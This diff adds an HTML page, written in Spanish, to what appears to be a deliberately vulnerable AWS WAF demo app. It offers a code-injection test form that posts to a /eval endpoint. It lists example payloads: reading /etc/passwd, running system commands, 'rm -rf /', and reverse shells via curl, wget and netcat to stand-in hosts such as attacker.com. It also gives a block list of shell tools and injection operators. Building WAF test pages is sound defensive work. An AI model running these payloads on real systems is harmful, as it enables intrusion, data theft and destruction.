@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pruebas API REST - AWS WAF Demo</title>
+    <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="nav-breadcrumb">
+            <a href="/">Inicio</a>
+            <span class="icon">›</span>
+            <span>Code Injection</span>
+        </div>
+
+        <div class="header">
+            <h1>Pruebas Code Injection</h1>
+            <p>Testea inyección de código JavaScript malicioso para validación de protección de WAF</p>
+        </div>
+
+        <div class="card">
+            <h2>Prueba Code Injection</h2>
+            <p>Simula inyección de código JavaScript malicioso:</p>
+            
+            <form action="/eval" method="POST" class="form-group">
+                <label for="expression">Expresión JavaScript:</label>
+                <input type="text" id="expression" name="expression" class="form-control" 
+                       placeholder="ej. 2+2 o process.exit()" required>
+                <button type="submit" class="btn btn-danger" style="margin-top: 1rem;">
+                    Evaluar Expresión
+                </button>
+            </form>
+            
+            <div class="alert alert-warning" style="margin-top: 1rem;">
+                <strong>Pruebas peligrosas:</strong> 
+                <code>process.exit()</code>, <code>require('fs')</code>, <code>global.process</code>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Ejemplos de Código Malicioso</h2>
+            <div class="test-examples">
+                <h3>Inyección de Código JavaScript (Node.js):</h3>
+                <ul>
+                    <li><code>process.exit()</code> - Terminar el servidor</li>
+                    <li><code>require('fs').readFileSync('/etc/passwd')</code> - Leer archivos del sistema</li>
+                    <li><code>require('child_process').execSync('ls -la')</code> - Ejecutar comandos del sistema</li>
+                    <li><code>global.process.env</code> - Acceder a variables de entorno</li>
+                    <li><code>require('os').userInfo()</code> - Información del usuario del sistema</li>
+                    <li><code>require('fs').writeFileSync('hack.txt', 'hacked')</code> - Escribir archivos</li>
+                </ul>
+
+                <h3>Inyección de Comandos Shell:</h3>
+                <ul>
+                    <li><code>; cat /etc/passwd</code> - Leer archivos sensibles</li>
+                    <li><code>| whoami</code> - Identificar usuario actual</li>
+                    <li><code>&& rm -rf /</code> - Comando destructivo</li>
+                    <li><code>`curl http://attacker.com/shell.sh | bash`</code> - Reverse shell</li>
+                    <li><code>$(wget http://malware.com/virus)</code> - Descarga de malware</li>
+                    <li><code>; nc -e /bin/sh attacker.com 4444</code> - Netcat reverse shell</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Protecciones WAF Esperadas</h2>
+            <div class="alert alert-info">
+                <p><strong>El WAF debería bloquear:</strong></p>
+                <ul>
+                    <li>Palabras clave de ejecución: <code>exec</code>, <code>eval</code>, <code>system</code></li>
+                    <li>Acceso a módulos sensibles: <code>require</code>, <code>import</code>, <code>fs</code>, <code>child_process</code></li>
+                    <li>Comandos shell: <code>cat</code>, <code>ls</code>, <code>whoami</code>, <code>wget</code>, <code>curl</code>, <code>nc</code></li>
+                    <li>Operadores de inyección: <code>;</code>, <code>|</code>, <code>&&</code>, <code>||</code>, <code>`</code>, <code>$( )</code></li>
+                    <li>Path traversal: <code>../</code>, <code>..\\</code></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
